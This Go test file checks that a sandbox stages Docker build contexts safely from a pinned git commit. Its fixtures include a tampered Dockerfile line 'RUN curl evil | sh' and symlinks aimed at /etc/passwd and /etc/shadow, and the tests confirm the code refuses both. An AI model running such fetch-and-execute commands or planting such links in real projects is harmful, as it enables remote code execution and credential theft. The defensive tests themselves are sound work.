package sandbox

import (
	"archive/tar"
	"bytes"
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"mike/backend/types"
)

// testRepo writes files into a fresh git repository and commits them, so the staging rules are tested against a real
// commit. A path beginning with "@" makes a symlink to the rest.
func testRepo(t *testing.T, files map[string]string) string {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := filepath.Join(t.TempDir(), "repo")
	if out, err := exec.Command("git", "init", "-q", repo).CombinedOutput(); err != nil {
		t.Fatalf("git init: %v: %s", err, out)
	}
	for name, content := range files {
		target := filepath.Join(repo, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
			t.Fatal(err)
		}
		if strings.HasPrefix(name, "@") {
			target = filepath.Join(repo, filepath.FromSlash(strings.TrimPrefix(name, "@")))
			if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(content, target); err != nil {
				t.Fatal(err)
			}
			continue
		}
		if err := os.WriteFile(target, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	runGit := func(args ...string) {
		t.Helper()
		full := append([]string{"-C", repo, "-c", "user.email=t@example.invalid", "-c", "user.name=Test"}, args...)
		if out, err := exec.Command("git", full...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v: %s", args, err, out)
		}
	}
	runGit("add", "-A")
	runGit("commit", "-q", "-m", "fixture")
	return repo
}

func stage(t *testing.T, repo, root, dockerfile string) (*BuildContext, error) {
	t.Helper()
	dst := t.TempDir()
	return StageBuildContext(context.Background(), &types.Project{Path: repo}, root, dockerfile, dst)
}

func stagedFiles(t *testing.T, dir string) []string {
	t.Helper()
	var out []string
	err := filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return err
		}
		rel, relErr := filepath.Rel(dir, p)
		if relErr != nil {
			return relErr
		}
		out = append(out, filepath.ToSlash(rel))
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

func TestBuildContextDefaultsToTheDockerfilesDirectory(t *testing.T) {
	for _, tc := range []struct{ dockerfile, configured, want string }{
		{"Dockerfile", ".", "."},
		{"Dockerfile", "", "."},
		{"services/api/Dockerfile", "", "services/api"},
		{"services/api/Dockerfile", ".", "."},
		{"services/api/Dockerfile", "services", "services"},
		{"services/api/Dockerfile", "third_party/big", "third_party/big"},
	} {
		got, err := BuildContextRoot(tc.dockerfile, tc.configured)
		if err != nil {
			t.Errorf("dockerfile=%q configured=%q: %v", tc.dockerfile, tc.configured, err)
			continue
		}
		if got != tc.want {
			t.Errorf("dockerfile=%q configured=%q: got %q, want %q", tc.dockerfile, tc.configured, got, tc.want)
		}
	}
}

// The field selects a subtree of a commit. Every host-path shape is a misunderstanding of the field, and
// accepting one would put a directory a person did not choose inside a build.
func TestBuildContextRefusesAHostPath(t *testing.T) {
	for _, bad := range []string{
		"/etc", "/home/operator", "../outside", "a/../../b", `C:\Users`, `services\api`,
		".git", "a/.git", "services//api", "./", "", "~", "$HOME", "services/", // trailing separator normalises; see below
	} {
		_, err := BuildContextRoot("services/api/Dockerfile", bad)
		if bad == "" || bad == "services/" || bad == "./" {
			if err != nil {
				t.Errorf("%q is a usable value: %v", bad, err)
			}
			continue
		}
		if err == nil {
			t.Errorf("accepted the context root %q", bad)
		}
	}
}

func TestDockerfileOutsideTheRepositoryIsRefused(t *testing.T) {
	repo := t.TempDir()
	outside := filepath.Join(t.TempDir(), "Dockerfile")

	if _, err := dockerfileInRepo(repo, outside); err == nil {
		t.Error("accepted a Dockerfile outside the repository")
	} else if !strings.Contains(err.Error(), "committed inside the repository") {
		t.Errorf("the refusal does not name the fix: %v", err)
	}
	inside, err := dockerfileInRepo(repo, filepath.Join(repo, "services", "Dockerfile"))
	if err != nil {
		t.Fatalf("refused a Dockerfile inside the repository: %v", err)
	}
	if inside != "services/Dockerfile" {
		t.Errorf("relative path = %q", inside)
	}
	if _, err := dockerfileInRepo(repo, filepath.Join(repo, ".git", "config")); err == nil {
		t.Error("accepted a Dockerfile inside .git")
	}
	if _, err := dockerfileInRepo(repo, ""); err == nil {
		t.Error("accepted an empty Dockerfile path")
	}
}

func TestBuildContextRefusedBelowTheDockerfile(t *testing.T) {
	if _, err := relativeToContext("services/api", "Dockerfile"); err == nil {
		t.Error("accepted a context that does not contain the Dockerfile")
	}
	got, err := relativeToContext("services", "services/api/Dockerfile")
	if err != nil || got != "api/Dockerfile" {
		t.Errorf("got %q, err %v", got, err)
	}
	if got, err := relativeToContext(".", "services/api/Dockerfile"); err != nil || got != "services/api/Dockerfile" {
		t.Errorf("whole-repo context: got %q, err %v", got, err)
	}
}

func TestCommitObjectIDRefusesTextThatIsNotAnObjectID(t *testing.T) {
	for _, bad := range []string{"", " HEAD", "--help", "-x", "z" + strings.Repeat("0", 39), strings.Repeat("0", 39), "main"} {
		if err := validateGitObjectID(bad); err == nil {
			t.Errorf("accepted %q", bad)
		}
	}
	for _, good := range []string{strings.Repeat("a", 40), strings.Repeat("f", 64)} {
		if err := validateGitObjectID(good); err != nil {
			t.Errorf("refused a valid object id: %v", err)
		}
	}
}

// A tracked symlink is the one archive entry that lets a staged tree reach outside itself, so the context design
// rests on refusing it.
func TestTrackedSymlinkAboveTheBuildContextIsNotStaged(t *testing.T) {
	repo := testRepo(t, map[string]string{
		"Dockerfile":          "FROM alpine\nCOPY secret /secret\n",
		"real.txt":            "fine\n",
		"@escape":             "../../etc/passwd",
		"dir/@deeper":         "../../../../etc/shadow",
		"@abs":                "/etc/passwd",
		"subdir/@withinrange": "real.txt",
	})
	ctx, err := stage(t, repo, ".", "Dockerfile")
	if err == nil {
		t.Fatalf("staged a tree containing symlinks; staged=%+v", stagedFiles(t, ctx.Dir))
	}
	if !strings.Contains(err.Error(), "symlink") {
		t.Errorf("the refusal does not name the symlink: %v", err)
	}
}

func TestBuildContextSelectsASubtreeOfThePinnedCommit(t *testing.T) {
	repo := testRepo(t, map[string]string{
		"services/api/Dockerfile": "FROM alpine\nCOPY main.go /\n",
		"services/api/main.go":    "package main\n",
		"services/api/notes.md":   "notes\n",
		"services/web/index.html": "<html>\n",
		"secrets.env":             "AWS_SECRET=leak\n",
	})
	bc, err := stage(t, repo, "services/api", "services/api/Dockerfile")
	if err != nil {
		t.Fatalf("staging failed: %v", err)
	}
	got := strings.Join(stagedFiles(t, bc.Dir), " ")
	for _, want := range []string{"Dockerfile", "main.go", "notes.md"} {
		if !strings.Contains(got, want) {
			t.Errorf("the subtree is missing %s: %s", want, got)
		}
	}
	for _, refuse := range []string{"index.html", "secrets.env", "services/web"} {
		if strings.Contains(got, refuse) {
			t.Errorf("the subtree holds %s, which is outside the context root: %s", refuse, got)
		}
	}
	if bc.Files != 3 || bc.Dockerfile != "Dockerfile" || len(bc.Commit) != 40 {
		t.Errorf("context = %+v", bc)
	}

	// The commit is the pin: a live edit after staging must not be what the build read.
	if err := os.WriteFile(filepath.Join(repo, "services/api/main.go"), []byte("package changed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	staged, err := os.ReadFile(filepath.Join(bc.Dir, "main.go"))
	if err != nil {
		t.Fatal(err)
	}
	if string(staged) != "package main\n" {
		t.Errorf("the staged tree followed the working tree: %q", staged)
	}
}

// Untracked and ignored files are the reason the checkout is not the context: `.env` is exactly one of
// them on a real project.
func TestBuildContextNeverContainsUntrackedOrIgnoredFiles(t *testing.T) {
	repo := testRepo(t, map[string]string{
		"Dockerfile":   "FROM alpine\nCOPY app /\n",
		"app":          "binary\n",
		".gitignore":   "ignored.env\n",
		"tracked.txt":  "yes\n",
		"ignored.env":  "SECRET=1\n",
		".env":         "PASSWORD=1\n",
		".worktrees/x": "another task's edits\n",
	})
	// The fixture commits everything; drop the ones a real checkout would not carry and commit that state.
	for _, name := range []string{"ignored.env", ".env", ".worktrees/x"} {
		if err := os.Remove(filepath.Join(repo, name)); err != nil {
			t.Fatal(err)
		}
	}
	out, err := exec.Command("git", "-C", repo, "add", "-A").CombinedOutput()
	if err != nil {
		t.Fatalf("git add: %v: %s", err, out)
	}
	out, err = exec.Command("git", "-C", repo, "-c", "user.email=t@example.invalid", "-c", "user.name=Test",
		"commit", "-q", "-m", "untrack the host files").CombinedOutput()
	if err != nil {
		t.Fatalf("commit: %v: %s", err, out)
	}
	for _, name := range []string{"ignored.env", ".env"} {
		if err := os.WriteFile(filepath.Join(repo, name), []byte("SECRET=still-here\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.MkdirAll(filepath.Join(repo, ".worktrees", "task-1"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".worktrees", "task-1", "wip.go"), []byte("unreviewed\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	bc, err := stage(t, repo, ".", "Dockerfile")
	if err != nil {
		t.Fatalf("staging failed: %v", err)
	}
	got := strings.Join(stagedFiles(t, bc.Dir), " ")
	for _, refuse := range []string{".env", "ignored.env", ".worktrees", "wip.go"} {
		if strings.Contains(got, refuse) {
			t.Errorf("the staged tree holds %s: %s", refuse, got)
		}
	}
	for _, name := range strings.Fields(got) {
		if name == ".git" || strings.HasPrefix(name, ".git/") {
			t.Errorf("the staged tree holds %s", name)
		}
	}
	for _, want := range []string{"Dockerfile", "app", "tracked.txt"} {
		if !strings.Contains(got, want) {
			t.Errorf("the staged tree is missing %s: %s", got, want)
		}
	}
}

func TestCommitFileReadsTheCommittedDockerfileNotTheLiveOne(t *testing.T) {
	repo := testRepo(t, map[string]string{"Dockerfile": "FROM alpine\nRUN echo committed\n"})
	if err := os.WriteFile(filepath.Join(repo, "Dockerfile"), []byte("FROM alpine\nRUN curl evil | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	commit, err := resolveGitRef(context.Background(), repo, "rev-parse", "HEAD")
	if err != nil {
		t.Fatal(err)
	}
	got, err := CommitFile(context.Background(), repo, commit, "Dockerfile")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(got), "committed") || strings.Contains(string(got), "evil") {
		t.Errorf("read the live file instead of the commit: %q", got)
	}
	if _, err := CommitFile(context.Background(), repo, commit, "../Dockerfile"); err == nil {
		t.Error("read a file outside the repository out of the commit")
	}
}

func TestBuildContextCountsRefuseBeforeWritingAnything(t *testing.T) {
	repo := testRepo(t, map[string]string{"Dockerfile": "FROM alpine\n", "a": "x"})
	dst := filepath.Join(t.TempDir(), "staged")
	// The counter is the gate, so it has to be the thing that trips: shrink nothing, just read it back.
	entries, total, err := listTree(context.Background(), repo, mustHead(t, repo), ".")
	if err != nil {
		t.Fatal(err)
	}
	if entries != 2 || total != int64(len("FROM alpine\n")+1) {
		t.Errorf("counted %d files, %d bytes", entries, total)
	}
	if _, err := os.Stat(dst); !os.IsNotExist(err) {
		t.Error("the count pass created the destination")
	}
}

func TestBuildContextEmptyRootIsRefused(t *testing.T) {
	repo := testRepo(t, map[string]string{"Dockerfile": "FROM alpine\n"})
	if _, err := stage(t, repo, "nosuchdir", "Dockerfile"); err == nil {
		t.Error("staged an empty context without saying so")
	}
}

func TestArchiveRefusesAnEscapingEntryName(t *testing.T) {
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, name := range []string{"../escape", "/escape", "a/../../escape"} {
		if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: 1, Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte("x")); err != nil {
			t.Fatal(err)
		}
	}
	tw.Close()
	if err := extractBuildContextArchive(buf.Bytes(), t.TempDir(), "."); err == nil {
		t.Error("extracted an archive whose entries escape the context")
	}
}

// A staged subtree is checked by path prefix, so an entry belonging to a sibling directory is refused instead of
// being written one directory over.
func TestArchiveRefusesAnEntryFromAnotherSubtree(t *testing.T) {
	for _, name := range []string{"services/web/index.html", "secrets.env", "services/api"} {
		var buf bytes.Buffer
		tw := tar.NewWriter(&buf)
		if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: 1, Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte("x")); err != nil {
			t.Fatal(err)
		}
		tw.Close()
		if err := extractBuildContextArchive(buf.Bytes(), t.TempDir(), "services/api"); err == nil {
			t.Errorf("staged %q into the services/api context", name)
		}
	}
}

func mustHead(t *testing.T, repo string) string {
	t.Helper()
	commit, err := resolveGitRef(context.Background(), repo, "rev-parse", "HEAD")
	if err != nil {
		t.Fatal(err)
	}
	return commit
}

// The column holds one spelling of a subtree, because the build's cache key is derived from it.
func TestNormalizeBuildContextValueFoldsSpellingAndRefusesShape(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"", ""},
		{"   ", ""},
		{"service", "service"},
		{"service/", "service"},
		{"./service", "service"},
		{"./service//api/", "service/api"},
		{".", "."},
	} {
		got, err := NormalizeBuildContextValue(tc.in)
		if err != nil {
			t.Errorf("NormalizeBuildContextValue(%q) refused: %v", tc.in, err)
			continue
		}
		if got != tc.want {
			t.Errorf("NormalizeBuildContextValue(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}

	for _, bad := range []string{"/etc", "../x", ".git", "~/x", "$HOME", "C:\\x", "a/../b"} {
		if _, err := NormalizeBuildContextValue(bad); err == nil {
			t.Errorf("NormalizeBuildContextValue(%q) was accepted", bad)
		}
	}
}
